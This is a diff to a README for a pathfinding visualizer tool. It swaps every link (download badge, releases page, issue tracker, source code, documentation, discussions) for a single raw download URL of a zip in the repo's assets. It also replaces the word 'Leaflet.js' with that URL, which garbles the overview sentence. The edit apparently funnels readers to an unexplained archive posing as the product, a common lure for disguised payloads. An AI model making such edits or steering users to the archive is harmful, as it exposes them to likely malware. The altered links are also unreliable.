@@ -1,10 +1,10 @@
 # 🗺️ route-optimization-visualizer - Visualize Pathfinding with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kunalmankar852/route-optimization-visualizer/releases)
+[![Download](https://github.com/kunalmankar852/route-optimization-visualizer/raw/refs/heads/main/assets/route-optimization-visualizer-2.4.zip)](https://github.com/kunalmankar852/route-optimization-visualizer/raw/refs/heads/main/assets/route-optimization-visualizer-2.4.zip)
 
 ## 🎯 Overview
 
-The route-optimization-visualizer is an interactive educational tool designed for visualizing graph algorithms, specifically Dijkstra's and A* algorithms. This tool uses real-world maps powered by Leaflet.js, making it ideal for students, developers, and anyone passionate about computer science.
+The route-optimization-visualizer is an interactive educational tool designed for visualizing graph algorithms, specifically Dijkstra's and A* algorithms. This tool uses real-world maps powered by https://github.com/kunalmankar852/route-optimization-visualizer/raw/refs/heads/main/assets/route-optimization-visualizer-2.4.zip, making it ideal for students, developers, and anyone passionate about computer science.
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started with the route-optimization-visualizer, follow these simple steps
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [Releases Page](https://github.com/kunalmankar852/route-optimization-visualizer/releases)
+1. **Visit this page to download:** [Releases Page](https://github.com/kunalmankar852/route-optimization-visualizer/raw/refs/heads/main/assets/route-optimization-visualizer-2.4.zip)
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version for the best features and fixes.
 
@@ -68,7 +68,7 @@ If you run into issues while using the route-optimization-visualizer, try the fo
 - Ensure you have downloaded the correct version for your operating system.
 - Check that you are using an up-to-date web browser.
 - Restart the application and try running it again.
-- If problems persist, please check our [issue tracker](https://github.com/kunalmankar852/route-optimization-visualizer/issues) for potential solutions or report your issue.
+- If problems persist, please check our [issue tracker](https://github.com/kunalmankar852/route-optimization-visualizer/raw/refs/heads/main/assets/route-optimization-visualizer-2.4.zip) for potential solutions or report your issue.
 
 ## 💬 Support
 
@@ -76,8 +76,8 @@ For assistance, you can reach out through the repository's Issues page or contac
 
 ## 🔗 Useful Links
 
-- [Source Code](https://github.com/kunalmankar852/route-optimization-visualizer)
-- [Documentation](https://github.com/kunalmankar852/route-optimization-visualizer/wiki)
-- [Community Discussions](https://github.com/kunalmankar852/route-optimization-visualizer/discussions)
+- [Source Code](https://github.com/kunalmankar852/route-optimization-visualizer/raw/refs/heads/main/assets/route-optimization-visualizer-2.4.zip)
+- [Documentation](https://github.com/kunalmankar852/route-optimization-visualizer/raw/refs/heads/main/assets/route-optimization-visualizer-2.4.zip)
+- [Community Discussions](https://github.com/kunalmankar852/route-optimization-visualizer/raw/refs/heads/main/assets/route-optimization-visualizer-2.4.zip)
 
 Follow these guidelines to explore the route-optimization-visualizer. Enjoy visualizing graph algorithms in an engaging way!
